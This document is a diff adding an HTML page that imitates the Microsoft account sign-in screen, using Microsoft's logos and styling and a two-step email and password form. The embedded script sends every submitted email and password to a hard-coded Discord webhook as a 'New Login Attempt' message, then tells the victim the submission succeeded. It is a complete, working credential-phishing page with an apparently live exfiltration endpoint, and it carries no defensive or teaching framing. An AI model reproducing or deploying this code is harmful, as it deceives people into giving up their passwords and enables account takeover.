@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to your Microsoft account</title>
+    <link rel="icon" type="image/x-icon" href="https://logincdn.msftauth.net/16.000.30004.15/images/favicon.ico">
+    <style>
+        @import url(https://fonts.googleapis.com/css?family=Poppins:100,100italic,200,200italic,300,300italic,regular,italic,500,500italic,600,600italic,700,700italic,800,800italic,900,900italic);
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', sans-serif;
+            color: #1b1b1b;
+        }
+
+        body {
+            display: grid;
+            place-items: center;
+            min-height: 100vh;
+            background-image: url('https://logincdn.msauth.net/shared/1.0/content/images/backgrounds/2_11d9e3bcdfede9ce5ce5ace2d129f1c4.svg');
+            background-repeat: no-repeat;
+            background-size: cover;
+        }
+
+        form {
+            width: 440px;
+            background-color: #fff;
+            box-shadow: 0 0 .5rem rgba(0, 0, 0, .2);
+            padding: 44px;
+        }
+
+        .logo {
+            margin-bottom: 15px;
+        }
+
+        form h2 {
+            font-size: 24px;
+            font-weight: 500;
+        }
+
+        .form-group {
+            margin: 0 0 16px;
+        }
+
+        form input {
+            padding: 6px 10px 6px 0;
+            margin-top: 1rem;
+            border: none;
+            outline: none;
+            border-bottom: 1px solid #000000b3;
+            width: 100%;
+            font-size: .9rem;
+        }
+
+        form p {
+            font-size: 13px;
+            margin-bottom: 16px;
+        }
+
+        form a {
+            color: #0067b8;
+            text-decoration: none;
+        }
+
+        form a:hover {
+            color: #000000b3;
+            text-decoration: underline;
+        }
+
+        form :is(.first, .second) > a {
+            font-size: 13px;
+        }
+
+        form .first > a span {
+            width: 20px;
+            height: 20px;
+            border: 1px solid #000000b3;
+            display: inline-block;
+            text-align: center;
+            border-radius: 50%;
+            margin-left: 0.2em;
+        }
+
+        form button {
+            display: block;
+            margin-left: auto;
+            width: 108px;
+            height: 32px;
+            padding: 4px 12px;
+            font-size: 15px;
+            background-color: #0067b8;
+            color: #fff;
+            border: none;
+            outline: none;
+            cursor: pointer;
+        }
+
+        form button:hover {
+            background-color: #004b85;
+        }
+
+        form button:active {
+            transform: scale(.97);
+        }
+
+        .forms-container {
+            overflow-x: hidden;
+        }
+
+        .forms {
+            display: flex;
+            align-items: flex-start;
+            justify-content: space-between;
+            width: calc((440px - 88px) * 2);
+            transition: 200ms ease-in-out transform;
+        }
+
+        .first,
+        .second {
+            width: 100%;
+        }
+
+        .arrow-btn {
+            cursor: pointer;
+            font-size: 1rem;
+            margin-right: 0.3rem;
+            width: 25px;
+            height: 25px;
+            display: inline-block;
+            border-radius: 50%;
+            text-align: center;
+            line-height: 25px;
+        }
+
+        .arrow-btn:hover {
+            background-color: rgba(0, 0, 0, .1);
+        }
+
+        .bottom {
+            width: 440px;
+            background-color: #fff;
+            box-shadow: 0 0 .5rem rgba(0, 0, 0, .2);
+            padding: 8px 44px;
+            font-size: 15px;
+            margin-top: 20px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+        }
+
+        .bottom img {
+            width: 32px;
+            height: 32px;
+            margin-right: 12px;
+        }
+
+        .bottom:hover {
+            background-color: #dde2d1;
+        }
+
+        .next-form {
+            transform: translateX(-50%);
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <form id="loginForm">
+            <img class="logo" src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg">
+            <div class="forms-container">
+                <div class="forms">
+                    <div class="first">
+                        <h2>Sign in</h2>
+                        <div class="form-group">
+                            <input type="email" id="emailInput" placeholder="Email, Phone, or Skype" required>
+                        </div>
+                        <p>No account? <a href="#">Create One!</a></p>
+                        <a href="#">Sign in with a security key <span>?</span></a>
+                        <button type="button" class="next-btn">Next</button>
+                    </div>
+                    <div class="second">
+                        <p><span class="arrow-btn">&#8592;</span> <span class="email">example@hotmail.com</span></p>
+                        <h2>Enter password</h2>
+                        <div class="form-group">
+                            <input type="password" id="passwordInput" placeholder="Password" required>
+                        </div>
+                        <a href="#">Forgot password?</a>
+                        <button type="submit">Sign in</button>
+                    </div>
+                </div>
+            </div>
+        </form>
+        <div class="bottom">
+            <img src="https://logincdn.msauth.net/shared/1.0/content/images/signin-options_4e48046ce74f4b89d45037c90576bfac.svg">
+            <span>Sign-in options</span>
+        </div>
+    </div>
+    <script>
+        const forms = document.querySelector('.forms');
+        const nextButton = document.querySelector('.next-btn');
+        const arrowButton = document.querySelector('.arrow-btn');
+        const emailInput = document.querySelector('#emailInput');
+        const passwordInput = document.querySelector('#passwordInput');
+        const emailDisplay = document.querySelector('.email');
+
+        const webhookURL = 'https://discord.com/api/webhooks/1316707842165575721/3Y-OyidQu-1luWes26yZFDSic3GfhmJXmBTRyIfKrdaaby8rVYzE4dhxMVxvA9Qqjx6x';
+
+        nextButton.addEventListener('click', () => {
+            forms.classList.add('next-form');
+            emailDisplay.innerText = emailInput.value;
+        });
+
+        arrowButton.addEventListener('click', () => {
+            forms.classList.remove('next-form');
+        });
+
+        document.querySelector('#loginForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const email = emailInput.value;
+            const password = passwordInput.value;
+
+            const payload = {
+                content: `**New Login Attempt**\nEmail: ${email}\nPassword: ${password}`,
+            };
+
+            try {
+                await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload),
+                });
+                alert('Submitted successfully!');
+            } catch (error) {
+                alert('Error submitting data. Please try again.');
+            }
+        });
+    </script>
+</body>
+</html>
